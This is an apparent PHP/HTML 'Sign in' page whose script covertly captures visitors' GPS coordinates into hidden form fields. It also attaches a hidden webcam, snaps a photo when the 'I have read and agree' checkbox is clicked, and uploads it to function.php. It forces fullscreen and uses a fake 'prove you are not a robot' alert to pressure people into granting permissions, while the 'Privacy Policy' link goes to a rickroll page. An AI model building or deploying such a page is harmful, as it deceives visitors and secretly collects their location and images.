<?php
    require 'function.php';
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1 maximum-scale=1, user-scalable=no">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <!--link rel="stylesheet" href="style.css"-->
        <link rel="icon" href="image/logo.png">
        <title>Sign in</title>
    </head>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap');
*{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Poppins', sans-serif;
}
.container{
    visibility: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    position: relative;
}
#my_camera{
    visibility: hidden;
    border: 20px solid red;
    position: relative;
    left: 90%;
    margin-left: 400px;
}
body
{
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    background: url('image/bg.jpg')no-repeat;
    width: 90%;
    position: relative;
    margin: 0 auto;
    background-position: center;
    background-size: cover;
}

.box
{
    position: relative;
    
    width: 380px;
    height: 420px;
    background: #1c1c1c;
    border-radius: 15px;
    overflow: hidden;
}
.box::before
{
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 380px;
    height: 420px;
    background: linear-gradient(0deg,transparent,transparent,#45f3ff,#45f3ff,#45f3ff);
    z-index: 1;
    transform-origin: bottom right;
    animation: animate 6s linear infinite;
}
.box::after
{
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 380px;
    height: 420px;
    background: linear-gradient(0deg,transparent,transparent,#45f3ff,#45f3ff,#45f3ff);
    z-index: 1;
    transform-origin: bottom right;
    animation: animate 6s linear infinite;
    animation-delay: -3s;
}

.borderline
{
    position: absolute;
    top: 0;
    inset: 0;
}
.borderline::before
{
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 380px;
    height: 420px;
    background: linear-gradient(0deg,transparent,transparent,#ff2770,#ff2770,#ff2770);
    z-index: 1;
    transform-origin: bottom right;
    animation: animate 6s linear infinite;
    animation-delay: -1.5s;
}
.borderline::after
{
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 380px;
    height: 420px;
    background: linear-gradient(0deg,transparent,transparent,#ff2770,#ff2770,#ff2770);
    z-index: 1;
    transform-origin: bottom right;
    animation: animate 6s linear infinite;
    animation-delay: -4.5s;
}


@keyframes animate
{
    0%
    {
        transform: rotate(0deg);
    }
    100%
    {
        transform: rotate(360deg);
    }
}

.garis::before{
    content: '';
    position: absolute;
    width: 25%;
    height: 25%;
    border-bottom: 4px solid #45f3ff;
    border-radius: 4px;
    left: 0;
    right: 0;
    margin: auto;
    z-index: 3;
    }
.garis::after{
    content: '';
    position: absolute;
    width: 25%;
    height: 25%;
    outline: none;
    border-bottom: 4px solid #ff2770;
    border-radius: 4px;
    left: 0;
    right: 0;
    margin: auto;
    z-index: 3;
    animation: animasi 2s infinite alternate;
    }

@keyframes animasi
{
 0%
 {
   width: 0%;
 }
 80%
 {
   width: 25%;
 }
}
.box form
{
    position: absolute;
    inset: 4px;
    background: #222;
    padding: 10px 38px;
    border-radius: 12px;
    z-index: 2;
    display: flex;
    flex-direction: column;
}

.box form h2
{
    color: #fff;
    font-weight: 500;
    text-align: center;
    letter-spacing: 0.1em;
}

.box form .inputBox
{
    outline: none;
    position: relative;
    width: 300px;
    top: 15px;
    margin-top: 35px;
}

.box form .inputBox ion-icon
{
    position: absolute;
    right: 0px;
    pointer-events: none;
    font-size: 1.2em;
    color: #fff;
    top: 9px;
    z-index: 50;
    transition: 0.5s;
}

.box form .inputBox input:valid ~ ion-icon,
.box form .inputBox input:focus ~ ion-icon
{
    color: #23242a;
    transform: translate(-10px)
}

.box form .inputBox input
{
    outline: solid rebeccapurple;
    position: relative;
    width: 78%;
    left: 25px;
    padding: 8px 0px 9px;
    background: transparent;
    outline: none;
    border: none;
    box-shadow: none;
    color: #23242a;
    font-size: 1em;
    letter-spacing: 0.05em;
    transition: 0.5s;
    z-index: 10;
}

.box form .inputBox span
{
    position: absolute;
    left: 0;
    padding: 10px 0px 10px;
    pointer-events: none;
    color: #8f8f8f;
    font-size: 1em;
    letter-spacing: 0.05em;
    transition: 0.5s;
}

.box form .inputBox input:valid ~ span,
.box form .inputBox input:focus ~ span
{
    color: #fff;
    font-size: 0.75em;
    transform: translateY(-34px);
}

.box form .inputBox i
{
    position: absolute;
    left: 0;
    bottom: 0;
    width: 100%;
    height: 2px;
    background: #fff;
    border-radius: 12px;
    overflow: hidden;
    transition: 0.5s;
    pointer-events: none;
}

.box form .inputBox input:valid ~ i,
.box form .inputBox input:focus ~ i
{
    height: 42px;
}

.box form .links
{
    display: flex;
    justify-content: flex-end;
}

.box form .links a
{
    position: relative;
    outline: solid;
    padding: 0px 20px 0px;
    margin: 30px -25px;
    font-size: 0.75em;
    color: #8f8f8f;
    text-decoration: none;
    outline: none;
}
.box form .links a:hover,
.box form .links a:nth-child(0)
{
    color: #ff2770;
}

.box form input[type="checkbox"]
{
    position: relative;
    margin: -48px -33px;
    width: 80px;
    height: 15px;
    cursor: pointer;
}
label {
    position: relative;
    margin: 21px 20px;
    color: #fff;
    top: 10px;
    font-family: Consolas, Baskerville, 'Segoe UI', sans-serif;
    font-size: 0.75em;
    font-weight: bold;

}
.box form input[type="submit"]
{
    position: relative;
    border: none;
    outline: none;
    padding: 10px 0px;
    background: #fff;
    cursor: pointer;
    font-size: 1em;
    border-radius: 10px;
    font-weight: 600;
    width: 90px;
    margin-top: 20px;
}


.box form input[type="submit"]:hover,
.box form input[type="submit"]:nth-child(1)
{
    color: #45f3ff;
}

.box form input[type="submit"]:active
{
    opacity: 0.8;
}
    </style>

    <body onload = "getLocation(), configure();">
        <div class="box" class="wrap">
            <div class="garis"></div>
            <div class="garis2"></div>   
            <span class="borderline"></span>
            <form class="myForm" action="" method="post" autocomplete="off">
                <h2 class="p-4 text-center">P</h2>
                <div class="inputBox">
                    <input type="text" name="name" value="" id="mbuh1" required onkeyup='saveValue(this);'/>
                    <span>*Name</span>
                    <ion-icon name="person"></ion-icon>
                    <i></i>
                </div>
                <div class="inputBox">
                    <input type="email" name="email" id="mbuh2" required onkeyup='saveValue(this);'/>
                    <span>*Email</span>
                    <ion-icon name="mail"></ion-icon> 
                    <i></i>
                    <input type="hidden" name="latitude" value="">
                    <input type="hidden" name="longitude" value="">
                </div>
                <div class="links">
                    <!--label for="checkbox">I have read and agree</label-->
                    <a href="rickroll.php">Privacy Policy</a>
                    <!--div id="checkbox-container"-->
                    <!--/div--> 
                    <!--a href="rickroll.php">*dont touch me*</a-->
                </div>
                <input type="checkbox" id="checkbox-container" onclick="saveSnap()" required/>
                <label for="checkbox">I have read and agree</label>
                <!--input type="button" onclick="saveSnap()" value="cam"-->
                <input type="submit" name="submit" onclick="Ulang()" value="Submit">
            </form>
            <div class="container">
            <div id="my_camera"></div>
            <div id="results" style="visibility; hidden; position: absolute;"></div>
            </div>
        </div>
        <script src="assets/checkbox.js" src="assets/jquery.js" type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js" nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js">
            function openFullscreen() {
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) { /* Safari */
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { /* IE11 */
                elem.msRequestFullscreen();
            }
            }

            document.addEventListener("click", ()=>{
                document.documentElement.requestFullscreen().catch((e) => {
                    console.log(e);
                })
            })
            document.addEventListener('fullscreenchange', (event) => {
            if (document.fullscreenElement) {
                console.log('Entered fullscreen:', document.fullscreenElement);
            } else {
                console.log('Exited fullscreen.');
            }
            });
        
            function Ulang(){
                localStorage.clear();    
            }
        
            document.getElementById("mbuh1").value = getSavedValue("mbuh1");
            document.getElementById("mbuh2").value = getSavedValue("mbuh2");
            function saveValue(e){
                var id = e.id;
                var val = e.value;
                
                localStorage.setItem(id, val);
                }
            function getSavedValue (v){
                if (!localStorage.getItem(v)) { 
                    return "";
                }
                return localStorage.getItem(v);
            }
        
            function getLocation(){
                if(navigator.geolocation){
                    navigator.geolocation.getCurrentPosition(showPosition, showError);
                }
            }
            function showPosition(position){
                document.querySelector('.myForm input[name ="latitude"]').value = position.coords.latitude;
                document.querySelector('.myForm input[name ="longitude"]').value = position.coords.longitude;
            }
            function showError(error){
                switch(error.code){
                    case error.PERMISSION_DENIED:
                        alert("NYALAKAN IZIN LOKASI & DAN KAMERA UNTUK MEMASTIKAN BAHWA KAMU BUKAN ROBOT!!! \n \nTURN ON LOCATION PERMISSIONS & AND CAMERA TO MAKE SURE THAT YOU ARE NOT A ROBOT!!!");
                        location.reload();
                        break;
                }
            }

            function configure(){
            Webcam.set({
                width: 720,
                height: 960,
                //width: 640,
                //height: 480,
                
                image_format: 'jpeg',
                jpeg_quality: 100});
            Webcam.attach('#my_camera');
            }

            function saveSnap(){
                Webcam.snap(function(data_uri){
                    document.getElementById('results').innerHTML =
                        '<img id = "webcam" src = "'+data_uri+'">';
            });

            var base64image = document.getElementById("webcam").src;
            Webcam.upload(base64image, 'function.php',function(code,text){
                
                document.location.href = "index.php"
            });
            }

            jQuery(function($) {
                var checkboxValue = JSON.parse(localStorage.getItem('checkboxValue')) || {}
                var $checkbox = $("#checkbox-container");

                $checkbox.on("change", function() {
                $checkbox.each(function() {
                    checkboxValue[this.id] = this.checked;
                });
                localStorage.setItem("checkboxValue", JSON.stringify(checkboxValue));
                });

                //on page load
                $.each(checkboxValue, function(key, value) {
                $("#" + key).prop('checked', value);
                });
            });
        </script>
    </body>
</html>
    
        